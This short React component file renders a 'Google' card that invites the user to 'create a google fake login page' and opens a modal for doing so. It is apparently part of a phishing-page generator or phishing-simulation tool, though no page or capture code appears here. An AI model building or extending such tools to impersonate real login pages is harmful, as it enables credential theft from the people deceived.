import Card from "../../../../shared/components/ui/card";
import { useState } from "react";
import AddGooglePage from "./add-google-page";

const GoogleCard = () => {
  const [isOpen, setIsOpen] = useState(false);
  return (
    <>
      <Card
        title="Google"
        decription="you can create a google fake login page by clicking here"
        imageURL="../../../../../public/covers/gmail-cover.jpg"
        onClick={() => setIsOpen(true)}
      />
      <AddGooglePage isOpen={isOpen} setIsOpen={setIsOpen} />
    </>
  );
};

export default GoogleCard;
